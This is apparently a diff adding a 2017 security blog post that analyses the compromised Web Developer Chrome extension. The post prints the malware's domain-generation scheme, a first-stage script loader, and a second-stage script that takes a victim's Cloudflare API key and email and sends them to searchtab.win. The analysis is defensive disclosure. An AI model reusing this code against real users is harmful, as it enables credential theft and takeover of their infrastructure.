@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I quickly began to wonder about the what and how. Several stories exist about how the extension came to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I believe to be, the more nefarious behavior of the extension. Since the extension calls out to an attacker-controlled URL, the payload hosted at that URL could be changed to anything at any time." />
+<meta name="keywords" content="[security vulnhub red team hackthebox blue team]" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://sec.alexflor.es/posts/chrome-extension-steals-cloudflare-api-tokens/" />
+
+
+    <title>
+        
+            Chrome Extension Steals Cloudflare Api Tokens :: &#34; r e s e a r c h &#34; 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+<meta itemprop="name" content="Chrome Extension Steals Cloudflare Api Tokens">
+<meta itemprop="description" content="Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I quickly began to wonder about the what and how. Several stories exist about how the extension came to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I believe to be, the more nefarious behavior of the extension. Since the extension calls out to an attacker-controlled URL, the payload hosted at that URL could be changed to anything at any time.">
+<meta itemprop="datePublished" content="2017-08-03T20:59:56-04:00" />
+<meta itemprop="dateModified" content="2017-08-03T20:59:56-04:00" />
+<meta itemprop="wordCount" content="420">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Chrome Extension Steals Cloudflare Api Tokens"/>
+<meta name="twitter:description" content="Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I quickly began to wonder about the what and how. Several stories exist about how the extension came to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I believe to be, the more nefarious behavior of the extension. Since the extension calls out to an attacker-controlled URL, the payload hosted at that URL could be changed to anything at any time."/>
+
+
+
+
+
+    <meta property="article:published_time" content="2017-08-03 20:59:56 -0400 EDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://sec.alexflor.es/posts/imf_walkthrough/">B2R: IMF Walkthrough</a></li><li><a href="https://sec.alexflor.es/posts/sickos_1.2/">B2R: SickOSv1.2</a></li><li><a href="https://sec.alexflor.es/posts/b2r_troll_walkthrough/">B2R: Tr0ll Walkthrough</a></li><li><a href="https://sec.alexflor.es/posts/wallaby/">B2R: Wallaby Walkthrough</a></li><li><a href="https://sec.alexflor.es/posts/ssh_pivoting/">Configuring SSH for Pivoting</a></li><li><a href="https://sec.alexflor.es/posts/bashbunny/">Creating BashBunny Payloads</a></li><li><a href="https://sec.alexflor.es/posts/egress-ports/">Finding Your Way Out From Behind Firewalls with Strict Outbound Rules</a></li><li><a href="https://sec.alexflor.es/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>2 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://sec.alexflor.es/posts/chrome-extension-steals-cloudflare-api-tokens/">Chrome Extension Steals Cloudflare Api Tokens</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <p>Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I
+quickly began to wonder about the what and how. Several stories exist about how the extension came
+to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I
+believe to be, the more nefarious behavior of the extension. Since the extension calls out to an
+attacker-controlled URL, the payload hosted at that URL could be changed to <em>anything</em> at any time.</p>
+<p>At the time of inspection, the code checks to see if the victim is on the Cloudflare domain. If it
+is, it starts an XHR request to fetch the users&rsquo; API token and ships it, along with the victim's
+email address, to an attacker-controlled server.</p>
+<h2 id="the-code">The Code</h2>
+<p>The extension contains code that, upon visiting any site, generates a dynamic URL that changes
+daily. It uses an MD5 hash of the current date, using the d-m-yyyy format.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">// tomorrow&#39;s url
+https://wd + md5(4-8-2017) + .win/ga.js
+https://wdfefe6195a8b014a1cc7d9cf2449d1b50.win/ga.js
+</code></pre></div><p>The following payload is fetched on every page that a victim navigates to. The payload is encoded and
+minified. Expanding it reveals the following portion:</p>
+<pre><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">if (top['location']['href']['indexOf']('cloudflare.com') &gt; -1) {
+  (function () {
+    var _0xb2b9x1 = document['createElement']('script');
+    _0xb2b9x1['type'] = 'text/javascript';
+    _0xb2b9x1['src'] = '//searchtab.win/ga.js';
+    var _0xb2b9x2 = document['getElementsByTagName']('script')[0];
+    _0xb2b9x2['parentNode']['insertBefore'](_0xb2b9x1, _0xb2b9x2)
+  })()
+} else {...
+</code></pre><p>The first-stage payload checks whether the victim is currently on cloudflare.com. If they are, it
+creates a new script tag on the page and sets its source to <code>//searchtab.win/ga.js</code>. This downloads
+stage 2 of the payload. If we look, we get the following script:</p>
+<pre><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">var xmlhttp = new XMLHttpRequest();
+xmlhttp.open('GET', 'https://www.cloudflare.com/api/v4/user/api_key', true);
+xmlhttp.setRequestHeader(&quot;x-atok&quot;, window.bootstrap.atok);
+xmlhttp.onreadystatechange = function() {
+  if (xmlhttp.readyState == 4) {
+    if(xmlhttp.status == 200) {
+      var obj = JSON.parse(xmlhttp.responseText);
+      var key = obj.result.api_key;
+      console.log(key);
+      (new Image).src = '//searchtab.win/ga.php?user=' +
+        encodeURIComponent(window.bootstrap.data.user.email) + '&amp;key=' + encodeURIComponent(key);
+    }
+  }
+};
+xmlhttp.send(null);
+</code></pre><p>This second-stage payload <code>GET</code>s the logged in user's API key then sends it, and the user's email,
+along to the <code>searchtab.win</code> domain.</p>
+<p>This was clearly a targeted attack against professional Web Developers. Web Developers will
+sometimes have access to production accounts on their employer's infrastructure. Though more common
+in smaller companies that don't have dedicated DevOps and/or Security teams, it's not impossible
+for bigger companies to fall prey.</p>
+<p>With a valid API token, attackers could control a company's public-facing infrastructure and
+create or modify sub/domains.</p>
+<p>We've currently blocked all outgoing requests to <code>*.win/ga.js</code> and asked our developers to update
+to version 0.5 of the Web Developer extension.</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>420 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2017-08-03 20:59 -0400</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://sec.alexflor.es/posts/vpn-access-point/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">Creating a VPN Access Point</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://sec.alexflor.es/posts/bashbunny/">
+                                <span class="button__text">Creating BashBunny Payloads</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2019</span>
+            
+            <span></span>
+            <span> <a href="https://sec.alexflor.es/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-12497311-8', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+
+    </body>
+</html>
